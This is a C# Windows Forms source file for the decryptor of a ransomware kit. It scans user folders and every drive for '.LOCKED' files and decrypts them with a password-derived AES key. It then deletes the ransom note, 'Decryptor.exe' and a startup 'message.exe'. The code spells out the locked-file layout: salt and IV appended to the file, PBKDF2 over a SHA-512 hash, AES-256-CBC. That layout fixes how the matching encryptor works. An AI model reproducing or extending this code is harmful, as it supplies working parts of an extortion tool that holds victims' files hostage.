using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;
using System.Reflection;


namespace Decrypt
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private void button1_Click(object sender, EventArgs e)
        {
            Form1.CheckForIllegalCrossThreadCalls = false;
            Thread th = new Thread(new ThreadStart(() =>
                {
                    string path = "";

                    label3.Text = "Working, do not close...";
                    label3.Visible = true;
                    this.BackColor = Color.Cyan;
                    this.textBox1.BackColor = Color.Cyan;
                    label3.Refresh();

                    if (!string.IsNullOrEmpty(path))
                    {
                        decryptDirectory(path);
                    }
                    else
                    {
                        var sensitiveDirs = new[]
                        {
                            Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                            Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
                        };
                        foreach (string str in sensitiveDirs)
                        {
                            decryptDirectory(str);
                        }

                        string[] drives = System.IO.Directory.GetLogicalDrives();
                        foreach (string str in drives)
                        {
                            decryptDirectory(str);
                        }

                        if (decrypted.Count() > 0)
                        {
                            label3.Text = "Files Decrypted!";
                            label3.Visible = true;
                            label2.Visible = false;
                            label3.Text = "FILES DECRYPTED.";
                            this.BackColor = Color.Lime;
                            this.textBox1.BackColor = Color.Lime;
                            label3.Refresh();

                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\Decryptor.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Decryptor.exe"); } catch { }

                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\message.exe"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\message.exe"); } catch { }

                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) +  @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + @"\RANSOM_NOTE.txt"); } catch { }
                            try { File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\RANSOM_NOTE.txt"); } catch { }
                        }
                        else if (failed.Count() > 0)
                        {
                            label3.Text = "Wrong Password :/";
                            label3.Visible = true;
                            this.BackColor = Color.Red;
                            this.textBox1.BackColor = Color.Red;
                            label3.Refresh();
                        }
                    }
                }));
            th.IsBackground = true;
            th.Start();
        }


        List<string> decrypted = new List<string>();
        List<string> failed = new List<string>();

        byte[] decryptAES(byte[] totalBytes, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var salt = totalBytes.Skip(totalBytes.Length - 1024).ToArray();
                    var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = totalBytes.Skip(totalBytes.Length - 1040).Take(16).ToArray();

                    AES.Mode = CipherMode.CBC;

                    byte[] byfuckoBeDecrypted = totalBytes.Take(totalBytes.Length -1040).ToArray();

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(byfuckoBeDecrypted, 0, byfuckoBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();


                }
            }

            return decryptedBytes;
        }

        void decryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA512.Create().ComputeHash(passwordBytes);


                byte[] bytesDecrypted = decryptAES(bytesToBeDecrypted, passwordBytes);

                File.WriteAllBytes(file, bytesDecrypted);
                string extension = System.IO.Path.GetExtension(file);
                string result = file.Substring(0, file.Length - extension.Length);
                System.IO.File.Move(file, result);
                decrypted.Add(file);
            }
            catch { failed.Add(file); }
        }


        void decryptDirectory(string location)
        {
            try
            {
                string password = textBox1.Text;

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);


                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension == ".LOCKED")
                    {
                        decryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    decryptDirectory(childDirectories[i]);
                }
            }
            catch { }
        }
    }
}
